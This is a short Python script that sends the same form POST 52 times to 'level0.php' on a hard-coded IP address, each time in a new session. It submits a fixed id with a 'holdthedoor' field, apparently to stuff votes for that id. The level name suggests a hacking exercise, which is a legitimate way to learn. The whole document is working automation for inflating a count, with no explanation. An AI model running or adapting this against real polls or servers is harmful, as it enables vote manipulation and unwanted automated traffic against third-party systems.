#!/usr/bin/python3
import requests
import time

url = 'http://158.69.76.135/level0.php'
myobj = {'id': '1687', 'holdthedoor': "Submit+Query"}

for i in range(52):

    session = requests.Session()

    x = session.post(url, data = myobj, timeout=2.50)
    print(i)

